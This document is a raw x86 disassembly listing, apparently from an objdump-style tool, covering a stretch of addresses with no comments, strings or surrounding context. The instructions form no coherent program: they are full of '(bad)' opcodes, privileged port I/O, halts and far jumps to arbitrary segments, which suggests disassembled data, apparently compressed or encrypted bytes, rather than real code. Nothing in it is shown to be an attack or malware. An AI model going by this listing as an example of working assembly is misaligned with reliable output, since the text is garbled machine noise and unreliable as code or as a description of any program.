  404ee3:	cmp    BYTE PTR [ecx-0x65555081],bl
  404ee9:	xchg   BYTE PTR [ecx],bl
  404eeb:	stc    
  404eec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404eed:	scas   eax,DWORD PTR es:[edi]
  404eee:	xchg   edx,eax
  404eef:	push   0x34
  404ef1:	and    eax,0xf0d1cbc7
  404ef6:	mov    esp,0xdb120b3d
  404efb:	fdiv   DWORD PTR [ecx+edx*8-0x3b]
  404eff:	int    0x2
  404f01:	aam    0xe
  404f03:	daa    
  404f04:	xchg   ebx,eax
  404f06:	pop    esp
  404f07:	add    cl,BYTE PTR [edx-0x7cf66447]
  404f0d:	rcl    BYTE PTR [ebx-0x7b],0xa1
  404f11:	pop    ebp
  404f12:	xchg   edx,eax
  404f13:	cwde   
  404f14:	jmp    0x404f57
  404f16:	mov    ds:0x627e9ab6,al
  404f1b:	add    edx,esp
  404f1d:	jo     0x404ef8
  404f1f:	push   ds
  404f20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f21:	mov    ebx,0xa4a5bbf0
  404f26:	mov    dh,bh
  404f28:	psrlq  mm6,QWORD PTR [ebx]
  404f2b:	mov    esi,0x312215b9
  404f30:	xor    al,0xb9
  404f32:	sahf   
  404f33:	mov    dh,0x63
  404f35:	lods   eax,DWORD PTR ds:[esi]
  404f36:	scas   al,BYTE PTR es:[edi]
  404f37:	clc    
  404f38:	adc    edx,ecx
  404f3a:	mov    bh,0x74
  404f3c:	xor    dh,BYTE PTR [ebx]
  404f3e:	add    al,0xcf
  404f40:	dec    ebp
  404f41:	js     0x404f42
  404f43:	pop    ss
  404f44:	push   edi
  404f45:	test   BYTE PTR [edx-0x339fece8],0xcc
  404f4c:	fs out 0xdd,al
  404f4f:	mov    al,0xda
  404f51:	and    eax,0x4c1a1ec3
  404f56:	test   al,0xe5
  404f58:	xor    al,BYTE PTR [ebx+edx*8]
  404f5b:	mov    ds:0xf0c2f741,eax
  404f60:	(bad)  
  404f61:	imul   edi,esp,0x90fb7cc2
  404f67:	jne    0x404fc7
  404f69:	mov    ch,bh
  404f6b:	cmp    al,0x81
  404f6d:	or     esp,eax
  404f6f:	mov    edx,0x6b0ed2bc
  404f74:	or     eax,0x99d86dfe
  404f79:	push   ebp
  404f7a:	mov    edx,0xe7c5b03c
  404f7f:	inc    eax
  404f80:	push   ebx
  404f81:	sti    
  404f82:	xchg   ebp,eax
  404f83:	fs xchg dh,cl
  404f86:	dec    edx
  404f87:	bound  ebx,QWORD PTR [eax-0x49363042]
  404f8d:	inc    ecx
  404f8e:	outs   dx,DWORD PTR ds:[esi]
  404f8f:	sub    ebx,DWORD PTR [edx]
  404f91:	aam    0x3d
  404f93:	imul   edi,esp,0xf681c117
  404f99:	call   0x5ce36fb2
  404f9e:	add    ecx,esi
  404fa0:	pop    esp
  404fa1:	ret    
  404fa2:	std    
  404fa3:	ret    0x4986
  404fa6:	pop    ebx
  404fa7:	fist   WORD PTR [ebx+0x34297487]
  404fad:	shl    BYTE PTR [esp+esi*2-0x260f48fb],cl
  404fb4:	lods   al,BYTE PTR ds:[esi]
  404fb5:	xchg   edx,eax
  404fb6:	shl    bh,cl
  404fb8:	push   edi
  404fb9:	loopne 0x404fce
  404fbb:	std    
  404fbc:	lods   eax,DWORD PTR ds:[esi]
  404fbd:	pop    ebx
  404fbe:	imul   edi,DWORD PTR [ebp+0x7b],0xffffffdc
  404fc2:	dec    esp
  404fc3:	sub    DWORD PTR [ecx-0x7b],edx
  404fc6:	call   0x2cc8:0xaab91832
  404fcd:	xor    ch,BYTE PTR [edi+ebp*8+0x3e]
  404fd1:	lahf   
  404fd2:	mov    ch,0x3a
  404fd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fd5:	adc    eax,0xc1f03a39
  404fda:	das    
  404fdb:	in     eax,0xc3
  404fdd:	jae    0x404f83
  404fdf:	pop    edi
  404fe0:	pusha  
  404fe1:	(bad)  
  404fe3:	jae    0x404fac
  404fe5:	jle    0x40501b
  404fe7:	jp     0x404fd2
  404fe9:	push   edx
  404fea:	mov    BYTE PTR [esi+0x7a0a8277],dh
  404ff0:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ff2:	xchg   esi,eax
  404ff3:	cdq    
  404ff4:	xchg   DWORD PTR [edx+0x59],ecx
  404ff7:	jmp    0x404f7e
  404ff9:	mov    bl,0x6a
  404ffb:	sub    eax,0x2209334f
  405000:	enter  0xb0e1,0x6e
  405004:	inc    ecx
  405005:	sub    BYTE PTR [esi-0x4b2d5735],bl
  40500b:	and    al,BYTE PTR [esi+0xd]
  40500e:	sti    
  40500f:	xlat   BYTE PTR ds:[ebx]
  405010:	fsubr  QWORD PTR [edi+edx*2-0x6d]
  405014:	sub    DWORD PTR ds:0x55caea8e,ebx
  40501a:	dec    eax
  40501b:	into   
  40501c:	nop
  40501d:	call   0x5c6a:0x79f3d5e
  405024:	cmp    BYTE PTR [ecx+0x1a6cefa1],bl
  40502a:	aad    0xdf
  40502c:	iret   
  40502d:	mov    al,0xef
  40502f:	or     ebx,ecx
  405031:	push   eax
  405032:	sahf   
  405033:	adc    BYTE PTR [ebx+eiz*2+0x60],bh
  405037:	(bad)  
  405038:	(bad)  
  40503a:	mov    BYTE PTR [esi+0x74],bl
  40503d:	pop    ebx
  40503e:	pop    edx
  40503f:	jne    0x40503f
  405041:	into   
  405042:	popa   
  405043:	push   ds
  405044:	imul   DWORD PTR [ecx+0x5ea43a9c]
  40504a:	mov    esp,0x4b3f98af
  40504f:	xor    eax,0xfd42e621
  405054:	cwde   
  405055:	adc    al,BYTE PTR [edi-0x5a269f0f]
  40505b:	xor    ch,ch
  40505d:	ss int 0x3a
  405060:	dec    esp
  405061:	shl    BYTE PTR [edx-0x10],cl
  405064:	add    al,0xd2
  405066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405067:	pop    esi
  405068:	jno    0x4050d1
  40506a:	sbb    ah,BYTE PTR [esi]
  40506c:	inc    ebx
  40506d:	ins    DWORD PTR es:[edi],dx
  40506e:	js     0x405018
  405070:	inc    edx
  405071:	clc    
  405072:	in     eax,0x80
  405074:	(bad)  
  405075:	push   ebp
  405076:	popa   
  405077:	ficom  DWORD PTR [eax+0x6782f627]
  40507d:	mov    WORD PTR [edi+0x15],ss
  405080:	push   edi
  405081:	jo     0x4050c9
  405083:	adc    DWORD PTR [esi+0x17],ebp
  405086:	sub    eax,0x485f3a12
  40508b:	jl     0x405022
  40508d:	fmul   st(1),st
  40508f:	cdq    
  405090:	test   eax,0xa3aacc0a
  405095:	aam    0xba
  405097:	xchg   esi,eax
  405098:	dec    eax
  405099:	add    eax,0xb5e020d6
  40509e:	xor    BYTE PTR [edx],bl
  4050a0:	dec    edi
  4050a1:	push   0x75
  4050a3:	and    eax,0xd5a56004
  4050a8:	push   esi
  4050a9:	in     al,dx
  4050aa:	icebp  
  4050ab:	xchg   DWORD PTR [edi],esi
  4050ad:	inc    ecx
  4050ae:	dec    edx
  4050af:	outs   dx,DWORD PTR es:[esi]
  4050b1:	js     0x40507c
  4050b3:	addr16 faddp st(0),st
  4050b6:	xor    BYTE PTR [eax-0x7a],bh
  4050b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050ba:	add    BYTE PTR [edx],bl
  4050bc:	sti    
  4050bd:	or     al,0x9e
  4050bf:	out    0x33,eax
  4050c1:	adc    al,0xf3
  4050c3:	icebp  
  4050c4:	push   esp
  4050c5:	repz dec eax
  4050c7:	dec    esp
  4050c8:	ss pop esi
  4050ca:	ins    DWORD PTR es:[edi],dx
  4050cb:	jns    0x4050c4
  4050cd:	mov    ebp,0xe8e2c192
  4050d2:	mov    BYTE PTR [ebp+0x18],ah
  4050d5:	pop    eax
  4050d6:	loop   0x405145
  4050d8:	inc    esp
  4050d9:	adc    eax,0xf072ea92
  4050de:	shld   DWORD PTR [esi],ebx,0x20
  4050e2:	into   
  4050e3:	dec    ecx
  4050e4:	push   0x36
  4050e6:	out    0x45,eax
  4050e8:	jge    0x4050da
  4050ea:	cli    
  4050eb:	sar    DWORD PTR [ebx],cl
  4050ed:	mov    al,ds:0xe9335b49
  4050f2:	mov    WORD PTR ss:[esp+esi*8],es
  4050f6:	rol    edi,cl
  4050f8:	maskmovq mm5,(bad)
  4050f9:	imul   DWORD PTR [eax-0x533113c3]
  4050ff:	ror    BYTE PTR [ecx-0x5235efda],0x64
  405106:	repnz add esi,ecx
  405109:	pop    edi
  40510a:	js     0x4050aa
  40510c:	push   es
  40510d:	cmp    eax,0x16eae94
  405112:	mov    esp,0xca6ca478
  405117:	fsub   DWORD PTR [edx+0x67e3994e]
  40511d:	cli    
  40511e:	push   eax
  40511f:	pop    ds
  405120:	xchg   ebx,eax
  405121:	sub    eax,0x291658d4
  405126:	retf   
  405127:	adc    al,0x4a
  405129:	push   edi
  40512a:	add    eax,0x2eceba77
  40512f:	out    0x43,eax
  405131:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405132:	popf   
  405133:	and    eax,DWORD PTR [ebx-0x1c]
  405136:	add    al,0x1f
  405138:	ja     0x4050db
  40513a:	mov    esp,0xc7f4a43f
  40513f:	xchg   ebx,eax
  405140:	jbe    0x4051a9
  405142:	pusha  
  405143:	adc    esi,DWORD PTR [ebx+ebp*1]
  405146:	(bad)  
  405147:	ffree  st(0)
  405149:	lahf   
  40514a:	pop    eax
  40514b:	dec    eax
  40514c:	mov    es,WORD PTR [eax-0x7b]
  40514f:	dec    esi
  405150:	ret    0xc340
  405153:	sbb    dl,cl
  405155:	pusha  
  405156:	scas   al,BYTE PTR es:[edi]
  405157:	push   ebx
  405158:	icebp  
  405159:	loop   0x4051ad
  40515b:	jbe    0x405155
  40515d:	xlat   BYTE PTR ds:[ebx]
  40515e:	call   0xe8c8:0x76cf30a1
  405165:	(bad)  
  405166:	stos   BYTE PTR es:[edi],al
  405167:	add    al,0xec
  405169:	push   eax
  40516a:	(bad)  
  40516b:	cmp    BYTE PTR [ecx-0x5f],ch
  40516e:	test   al,0xfe
  405170:	inc    edi
  405171:	les    ebx,FWORD PTR [eax]
  405173:	fisubr DWORD PTR [ecx]
  405175:	mov    ecx,DWORD PTR [esi]
  405177:	je     0x405132
  405179:	iret   
  40517a:	xchg   ebx,eax
  40517b:	ins    DWORD PTR es:[edi],dx
  40517c:	pop    esi
  40517d:	nop
  40517e:	je     0x4051f7
  405180:	jae    0x40517a
  405182:	adc    cl,dh
  405184:	push   ss
  405185:	fld    TBYTE PTR [edi+0xd580d17]
  40518b:	add    al,0xca
  40518d:	out    0x36,al
  40518f:	dec    edx
  405190:	loopne 0x4051dc
  405192:	jno    0x405116
  405194:	nop
  405195:	and    esi,DWORD PTR [esi]
  405197:	mov    ebp,0xf8a63243
  40519c:	shl    DWORD PTR [edi+0x3d],cl
  40519f:	push   eax
  4051a0:	scas   eax,DWORD PTR es:[edi]
  4051a1:	cmp    eax,0x11ef7728
  4051a6:	xchg   esp,eax
  4051a7:	stos   DWORD PTR es:[edi],eax
  4051a8:	loop   0x405143
  4051aa:	(bad)  
  4051ab:	jecxz  0x4051b4
  4051ad:	sbb    esp,ebx
  4051af:	stos   BYTE PTR es:[edi],al
  4051b0:	dec    edx
  4051b1:	call   0xc643c893
  4051b6:	sbb    ch,0x34
  4051b9:	mov    ebp,0x585eb49f
  4051be:	(bad)  
  4051bf:	jo     0x4051fd
  4051c1:	or     ecx,DWORD PTR [ebp+0x229cb63b]
  4051c7:	popa   
  4051c8:	bnd repz jl 0x405164
  4051cc:	sub    BYTE PTR ds:0x7abbe537,0x7c
  4051d3:	add    edi,edi
  4051d5:	inc    ebp
  4051d6:	pop    ds
  4051d7:	int    0xa6
  4051d9:	loop   0x4051cd
  4051db:	pop    eax
  4051dc:	das    
  4051dd:	mov    ch,0xd1
  4051df:	(bad)  
  4051e0:	xchg   esp,eax
  4051e1:	pop    es
  4051e2:	sbb    eax,0x797130b2
  4051e7:	jle    0x405237
  4051e9:	sbb    BYTE PTR [ecx],dh
  4051eb:	inc    edx
  4051ec:	inc    edi
  4051ed:	int3   
  4051ee:	scas   eax,DWORD PTR es:[edi]
  4051ef:	cmp    BYTE PTR [edi+0x61],al
  4051f2:	push   ss
  4051f3:	retf   0x9a94
  4051f6:	cmp    DWORD PTR [edx-0x16f3701f],esp
  4051fc:	mov    al,ds:0x75b81004
  405201:	add    al,0x3
  405203:	push   esp
  405204:	gs mov dl,0xc6
  405207:	test   BYTE PTR [ebp+esi*8+0x36],0x13
  40520c:	or     eax,0xa0b6655a
  405211:	ror    BYTE PTR [ebp-0x1edabda3],0xae
  405218:	pop    edx
  405219:	add    edx,edi
  40521b:	push   eax
  40521c:	repnz pop ecx
  40521e:	dec    edx
  40521f:	shl    BYTE PTR [edx],0x99
  405222:	fimul  WORD PTR [ecx+ecx*8+0x5fd208e3]
  405229:	mov    eax,ds:0x9b1167db
  40522e:	stos   BYTE PTR es:[edi],al
  40522f:	jmp    0x4051b9
  405231:	mov    eax,0x667e56cf
  405236:	or     esi,ecx
  405238:	nop
  405239:	lea    ebx,[ebp-0x79dac707]
  40523f:	sub    BYTE PTR [ebp+0x5e6d1c63],bl
  405245:	or     al,0xef
  405247:	push   edx
  405248:	lea    ebx,[ebx+0x7c4bdb20]
  40524e:	xchg   edi,eax
  40524f:	push   ecx
  405250:	mov    cl,0x26
  405252:	mov    al,ds:0xfb1ec639
  405257:	ret    
  405258:	fistp  QWORD PTR [ebx+ecx*1-0x13]
  40525c:	scas   al,BYTE PTR es:[edi]
  40525d:	mov    edi,0x8ebb3660
  405262:	aad    0x58
  405264:	cmp    al,0x80
  405266:	or     BYTE PTR ds:0xa702b62,dh
  40526c:	mov    edi,0x891f611
  405271:	jnp    0x405287
  405273:	out    0x92,eax
  405275:	sbb    BYTE PTR [ecx-0x44],al
  405278:	fidiv  WORD PTR [edi+0x16ab237]
  40527e:	repz mov WORD PTR [ecx],?
  405281:	xor    al,BYTE PTR [ebp-0x40]
  405284:	add    BYTE PTR [ebx+ecx*8+0x22],dl
  405288:	add    esp,DWORD PTR [ecx+0x4b]
  40528b:	xchg   ebp,eax
  40528c:	jae    0x4052e6
  40528e:	inc    esp
  40528f:	or     eax,0x193fdc3d
  405294:	xchg   edi,eax
  405295:	mov    cl,0xff
  405297:	loope  0x405272
  405299:	bound  eax,QWORD PTR [edx]
  40529b:	jg     0x40526a
  40529d:	jne    0x4052ed
  40529f:	sbb    BYTE PTR [ebx],dl
  4052a1:	(bad)  
  4052a2:	(bad)  
  4052a4:	ret    0xc78e
  4052a7:	stos   DWORD PTR es:[edi],eax
  4052a8:	int    0x11
  4052aa:	lock sub dh,cl
  4052ad:	mov    edi,0xb0044554
  4052b2:	icebp  
  4052b3:	cmp    eax,0xc046f67c
  4052b8:	mov    al,0x78
  4052ba:	adc    dl,dl
  4052bc:	loopne 0x405338
  4052be:	jmp    0x405284
  4052c0:	fild   DWORD PTR [ebp-0x28]
  4052c3:	dec    eax
  4052c4:	aam    0x6e
  4052c6:	jecxz  0x4052cb
  4052c8:	sbb    eax,DWORD PTR [edx*1+0x5a69646e]
  4052cf:	shl    DWORD PTR [ebx-0x36],cl
  4052d2:	inc    ecx
  4052d3:	mov    BYTE PTR [edx+edi*1+0x21],dl
  4052d7:	cmp    dl,BYTE PTR [edx+0x2c]
  4052da:	mov    dl,0xe5
  4052dc:	mov    eax,0x24cabe33
  4052e1:	lock fdiv st(0),st
  4052e4:	xchg   ebp,eax
  4052e5:	xchg   BYTE PTR [edi-0x3b8bf7d9],bl
  4052eb:	xchg   DWORD PTR [eax],esi
  4052ed:	lea    eax,[eax]
  4052ef:	or     DWORD PTR [edi+0xaa42cff],esi
  4052f5:	mov    edi,edi
  4052f7:	xadd   esp,esp
  4052fa:	sbb    ecx,esp
  4052fc:	or     al,0x3c
  4052fe:	test   al,0x6
  405300:	jb     0x4052a4
  405302:	mov    cl,0x2f
  405304:	dec    eax
  405305:	xchg   ebp,eax
  405306:	outs   dx,BYTE PTR ds:[esi]
  405307:	jno    0x405290
  405309:	pop    ebx
  40530a:	cdq    
  40530b:	jns    0x4052b2
  40530d:	je     0x4052bc
  40530f:	js     0x4052f8
  405311:	lds    bx,DWORD PTR [ebp+0x6]
  405315:	in     eax,dx
  405316:	jns    0x405380
  405318:	clc    
  405319:	imul   esp,DWORD PTR [edi+ecx*2],0x815a977c
  405320:	cwde   
  405321:	mov    al,ds:0xe8444fac
  405326:	dec    esi
  405327:	popf   
  405328:	clc    
  405329:	sub    eax,0x1ac9ed30
  40532e:	mov    ah,0x21
  405330:	inc    ecx
  405331:	sar    BYTE PTR [ecx],1
  405333:	push   0x45
  405335:	cmp    BYTE PTR [esi],ch
  405337:	pop    ecx
  405338:	call   DWORD PTR [eax+0x49d5ca52]
  40533e:	xchg   edi,eax
  40533f:	pusha  
  405340:	jp     0x4053b2
  405342:	add    bh,BYTE PTR [edi]
  405344:	int3   
  405345:	sbb    eax,0x13bdbe8f
  40534a:	and    DWORD PTR [ebx-0x2059e770],ebp
  405350:	mov    dl,0x8e
  405352:	or     BYTE PTR [esi],0xf3
  405355:	xor    al,0xb1
  405357:	mov    esi,0x34abbdcc
  40535c:	lock enter 0xc86a,0xd5
  405361:	out    0x6f,eax
  405363:	test   al,0xb2
  405365:	xor    al,0x49
  405367:	ja     0x4052fb
  405369:	inc    edx
  40536a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40536b:	jbe    0x405389
  40536d:	pop    ds
  40536e:	clc    
  40536f:	loopne 0x405399
  405371:	add    DWORD PTR [ecx-0x74],ebx
  405374:	push   esi
  405375:	adc    ebp,DWORD PTR [ebp+0x73]
  405378:	cld    
  405379:	push   esi
  40537a:	ja     0x405382
  40537c:	jo     0x405391
  40537e:	add    dh,BYTE PTR [edi-0x69]
  405381:	call   0xc8c5:0x33689256
  405388:	cmp    bh,BYTE PTR [ebx-0x7449db54]
  40538e:	mov    bl,0x10
  405390:	fild   WORD PTR [ecx-0x7744baea]
  405396:	xchg   esi,eax
  405397:	sbb    BYTE PTR [esi+0x5c],ah
  40539a:	nop
  40539b:	xchg   esp,esp
  40539d:	lahf   
  40539e:	ins    BYTE PTR es:[edi],dx
  40539f:	jmp    0x5a10:0xac4d8350
  4053a6:	sub    al,0x59
  4053a8:	dec    ecx
  4053a9:	sub    al,0x0
  4053ab:	hlt    
  4053ac:	outs   dx,BYTE PTR ds:[esi]
  4053ad:	add    al,0xd3
  4053af:	add    ah,BYTE PTR ds:0xbd048361
  4053b5:	out    0xda,eax
  4053b7:	xchg   edx,eax
  4053b8:	mov    dh,0xac
  4053ba:	in     eax,dx
  4053bb:	mov    ah,BYTE PTR [edi]
  4053bd:	inc    edx
  4053be:	loop   0x4053b8
  4053c0:	dec    edi
  4053c1:	dec    eax
  4053c2:	pop    esi
  4053c3:	clc    
  4053c4:	(bad)  
  4053c6:	cmp    BYTE PTR [ebx-0x532d7c0c],0xa3
  4053cd:	jne    0x405397
  4053cf:	mov    edi,0xd7609fb
  4053d4:	push   edx
  4053d5:	mov    WORD PTR [eax],?
  4053d7:	cli    
  4053d8:	mov    edx,0x14f376bf
  4053dd:	clc    
  4053de:	dec    ebp
  4053df:	das    
  4053e0:	jae    0x40538e
  4053e2:	arpl   WORD PTR [edx],sp
  4053e4:	fiadd  WORD PTR [ebp-0x217f7e43]
  4053ea:	mov    ds:0x998d1794,al
  4053ef:	mov    edx,0x80331411
  4053f4:	sar    DWORD PTR [ebx+0x2d],cl
  4053f7:	jmp    0x2559:0x6f287c5
  4053fe:	ficomp DWORD PTR [edx]
  405400:	popf   
  405401:	cmp    eax,0xcef98253
  405406:	ret    
  405407:	fbld   TBYTE PTR [ebx-0x1bc2a878]
  40540d:	jle    0x405461
  40540f:	and    dl,BYTE PTR [edx]
  405411:	repnz mov ebx,0xe9ea4e4b
  405417:	xor    BYTE PTR [eax],0xcb
  40541a:	mov    ecx,0xf732373f
  40541f:	xor    DWORD PTR [edx+0x61772e73],ebx
  405425:	jecxz  0x4053c8
  405427:	sti    
  405428:	inc    eax
  405429:	(bad)  
  40542b:	add    eax,0x3d3ede2f
  405430:	xor    DWORD PTR [eax],ebp
  405432:	cmp    dh,bh
  405434:	sbb    ecx,DWORD PTR [eax-0x7b]
  405437:	xor    al,0x29
  405439:	xchg   ecx,eax
  40543a:	pushf  
  40543b:	or     al,0x7f
  40543d:	adc    BYTE PTR [eax+0x5eecd72a],ch
  405443:	xor    ebp,DWORD PTR [esp+ecx*1]
  405446:	xchg   ebp,eax
  405447:	bound  edx,QWORD PTR [edx]
  405449:	cmp    al,0xe8
  40544b:	loop   0x40546a
  40544d:	xor    esi,0x40d40adb
  405453:	data16 dec di
  405456:	sub    BYTE PTR [edx],bh
  405458:	mov    dl,0x40
  40545a:	xor    edi,ebx
  40545c:	popf   
  40545d:	xchg   esi,eax
  40545e:	ins    DWORD PTR es:[edi],dx
  40545f:	mov    edi,0xd9a98f6d
  405464:	add    ebp,DWORD PTR [ebx-0x626e90df]
  40546a:	or     eax,DWORD PTR [ecx-0x10b6e620]
  405470:	div    DWORD PTR [esi+0x3a]
  405473:	add    DWORD PTR [ecx+0x36],esp
  405476:	adc    esp,DWORD PTR [eax+0x2a]
  405479:	popf   
  40547a:	add    al,0x91
  40547c:	scas   eax,DWORD PTR es:[edi]
  40547d:	jb     0x4054b8
  40547f:	mov    esi,0xbee82bc1
  405484:	or     bl,BYTE PTR ss:[esi]
  405487:	pop    ds
  405488:	sub    al,0xae
  40548a:	cmp    edi,DWORD PTR [edx-0x5ab3a199]
  405490:	sbb    eax,0x8aab61c6
  405495:	js     0x40546a
  405497:	daa    
  405498:	nop    DWORD PTR [eax-0x34]
  40549c:	les    edi,FWORD PTR [esi]
  40549e:	add    edx,esi
  4054a0:	xor    BYTE PTR [eax+0x40b8ca1f],bl
  4054a6:	ins    DWORD PTR es:[edi],dx
  4054a7:	xchg   ebp,eax
  4054a8:	das    
  4054a9:	push   ecx
  4054aa:	jo     0x4054cd
  4054ac:	cmp    BYTE PTR [edi],dl
  4054ae:	aad    0x55
  4054b0:	leave  
  4054b1:	imul   BYTE PTR [ecx+0x7467a276]
  4054b7:	imul   BYTE PTR [esi-0x3a38e289]
  4054bd:	add    esi,eax
  4054bf:	dec    esp
  4054c0:	lahf   
  4054c1:	loopne 0x405484
  4054c3:	fs sub ch,al
  4054c6:	lds    edi,FWORD PTR [eax+0x15]
  4054c9:	mov    edi,0x559fda90
  4054ce:	iret   
  4054cf:	stc    
  4054d0:	dec    edx
  4054d1:	cld    
  4054d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054d3:	inc    edx
  4054d4:	cld    
  4054d5:	loopne 0x405516
  4054d7:	in     al,dx
  4054d8:	imul   DWORD PTR [esi+0x61]
  4054db:	xchg   ecx,eax
  4054dc:	inc    esp
  4054dd:	cmp    BYTE PTR [esi],dh
  4054df:	jl     0x40550d
  4054e1:	aad    0x1a
  4054e3:	push   edx
  4054e4:	call   0xe74:0x322eaa2
  4054eb:	les    ebx,FWORD PTR [ecx+esi*8+0x5b]
  4054ef:	les    edx,FWORD PTR [ecx-0x77]
  4054f2:	push   ds
  4054f3:	in     eax,dx
  4054f4:	popa   
  4054f5:	mov    dl,0xd0
  4054f7:	out    dx,eax
  4054f8:	push   eax
  4054f9:	mov    DWORD PTR [ecx],ebx
  4054fb:	(bad)  [bx-0x3c68]
  405500:	sahf   
  405501:	push   esp
  405502:	shl    DWORD PTR [esi-0x2],cl
  405505:	ins    BYTE PTR es:[edi],dx
  405506:	test   DWORD PTR [ecx-0x7c],ecx
  405509:	sbb    esi,edx
  40550b:	sbb    DWORD PTR [edx-0x5d],edi
  40550e:	sub    al,0x4
  405510:	repnz in eax,dx
  405512:	lods   al,BYTE PTR ds:[esi]
  405513:	dec    esp
  405514:	iret   
  405515:	xor    DWORD PTR [edx],esi
  405517:	and    ecx,DWORD PTR [ebx+0x24]
  40551a:	pusha  
  40551b:	mov    dh,0xda
  40551d:	pop    ebx
  40551e:	jne    0x405599
  405520:	xchg   esp,eax
  405521:	iret   
  405522:	push   ebx
  405523:	enter  0xf42a,0xff
  405527:	test   BYTE PTR [ebx-0xf45406f],bh
  40552d:	pop    esi
  40552e:	cwde   
  40552f:	sbb    BYTE PTR [ebp+ebx*8+0x5],0xdf
  405534:	(bad)  
  405535:	pop    ds
  405536:	lods   al,BYTE PTR ds:[esi]
  405537:	(bad)
  40553a:	mov    ah,0xbf
  40553c:	ja     0x405593
  40553e:	and    dh,bh
  405540:	in     al,0x7b
  405542:	mov    eax,ds:0x2fcb9b2
  405547:	sbb    ebp,DWORD PTR [edi-0x41]
  40554a:	inc    esp
  40554b:	lods   al,BYTE PTR ds:[esi]
  40554c:	fdivrp st(6),st
  40554e:	pop    esp
  40554f:	xchg   dl,dh
  405551:	lds    edi,FWORD PTR [eax+0x21cd0177]
  405557:	stos   BYTE PTR es:[edi],al
  405558:	push   0xddaa3bbf
  40555d:	push   cs
  40555e:	hlt    
  40555f:	sub    DWORD PTR [ebx-0x6b],0x618f60f0
  405566:	xlat   BYTE PTR ds:[ebx]
  405567:	push   eax
  405568:	pop    edi
  405569:	repnz ss ss pop esi
  40556d:	xchg   esi,eax
  40556e:	push   esp
  40556f:	adc    eax,DWORD PTR [edi-0x3a283c4c]
  405575:	xor    ecx,esi
  405577:	cwde   
  405578:	mov    al,0x4c
  40557a:	retf   0xf858
  40557d:	pushf  
  40557e:	test   al,0x28
  405580:	mov    eax,0xf050b0ee
  405585:	scas   al,BYTE PTR es:[edi]
  405586:	sbb    DWORD PTR [ebp-0x65bccbb9],esi
  40558c:	mov    ds:0x78f151a2,eax
  405591:	int    0x97
  405593:	stos   BYTE PTR es:[edi],al
  405594:	pop    es
  405595:	mov    ebx,DWORD PTR [esi]
  405597:	and    DWORD PTR [edx],ebx
  405599:	sbb    al,0xf7
  40559b:	daa    
  40559c:	push   ds
  40559d:	and    DWORD PTR [edx],eax
  40559f:	mov    dl,0x97
  4055a1:	push   es
  4055a2:	pushf  
  4055a3:	push   cs
  4055a4:	jae    0x405579
  4055a6:	push   esi
  4055a7:	clc    
  4055a8:	add    edx,eax
  4055aa:	cli    
  4055ab:	out    dx,eax
  4055ac:	dec    edi
  4055ad:	lahf   
  4055ae:	lea    esi,[ebp+0x52]
  4055b1:	lea    eax,[esi-0xa74e500]
  4055b7:	je     0x4055b7
  4055b9:	sbb    ebp,DWORD PTR [edi]
  4055bb:	adc    cl,0xb8
  4055be:	pop    esi
  4055bf:	or     ch,BYTE PTR [ecx]
  4055c1:	push   es
  4055c2:	in     eax,0x1d
  4055c4:	jmp    0x42a0:0xa7d46e64
  4055cb:	aad    0x2a
  4055cd:	mov    ch,0x52
  4055cf:	ffree  st(3)
  4055d1:	jne    0x4055ce
  4055d3:	jl     0x4055a7
  4055d5:	xor    ch,BYTE PTR [eax]
  4055d7:	xchg   ebp,eax
  4055d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055d9:	jo     0x4055ac
  4055db:	retf   
  4055dc:	mov    ds:0xd949006f,eax
  4055e1:	mov    ds:0xac26a9b8,eax
  4055e6:	xchg   DWORD PTR [eax-0x68],esi
  4055e9:	out    0xa7,eax
  4055eb:	sub    cl,BYTE PTR [ebx-0x53]
  4055ee:	xor    ecx,DWORD PTR [esi-0x8]
  4055f1:	mov    edx,ebp
  4055f3:	jl     0x405655
  4055f5:	jns    0x4055bc
  4055f7:	retf   
  4055f8:	sub    bl,BYTE PTR [edx+edi*8]
  4055fb:	(bad)  
  4055fd:	pop    edx
  4055fe:	dec    esi
  4055ff:	clc    
  405600:	adc    al,0x8b
  405602:	adc    esi,DWORD PTR [ecx+0x29]
  405605:	das    
  405606:	clc    
  405607:	mov    eax,0x9ffa6710
  40560c:	jo     0x4055be
  40560e:	xchg   ebx,eax
  40560f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405610:	fwait
  405611:	pop    eax
  405612:	into   
  405613:	test   eax,0x5db323ed
  405618:	arpl   WORD PTR [eax-0x3e],cx
  40561b:	and    al,0xac
  40561d:	fnstenv ds:0x8c503073
  405623:	adc    eax,0xf4606c87
  405628:	xchg   ebx,eax
  405629:	out    dx,al
  40562a:	retf   
  40562b:	xchg   ecx,eax
  40562c:	es aas 
  40562e:	fdivr  QWORD PTR [esi]
  405630:	xor    al,0x69
  405632:	gs loopne 0x40565b
  405635:	ds ins BYTE PTR es:[edi],dx
  405637:	xor    al,0xa2
  405639:	add    esi,ebx
  40563b:	push   esp
  40563c:	cld    
  40563d:	or     bh,BYTE PTR [edi]
  40563f:	mov    esp,0x5818a4cd
  405644:	jo     0x4055f0
  405646:	js     0x40568f
  405648:	and    edx,DWORD PTR [eax-0x33eceddf]
  40564e:	mov    ds:0x95203064,eax
  405653:	aas    
  405654:	pushf  
  405655:	pop    ss
  405656:	pop    eax
  405657:	push   cs
  405658:	pop    edi
  405659:	sub    DWORD PTR [edi],eax
  40565b:	jne    0x40567a
  40565d:	pushf  
  40565e:	mov    DWORD PTR [eax-0x50],0xd6a67e49
  405665:	add    bh,BYTE PTR [ecx+0x22ded2ca]
  40566b:	or     BYTE PTR [ebx+edi*1+0x6b],bh
  40566f:	mov    al,ds:0xbd292301
  405674:	fild   DWORD PTR [ebx+0x0]
  405677:	adc    ch,ah
  405679:	dec    edi
  40567a:	add    ecx,DWORD PTR [edi]
  40567c:	add    DWORD PTR [edi],ebx
  40567e:	nop
  40567f:	sub    esi,DWORD PTR [ecx-0x6693dc2f]
  405685:	jmp    0x4a4e21d3
  40568a:	mov    edi,0xf5e0fe31
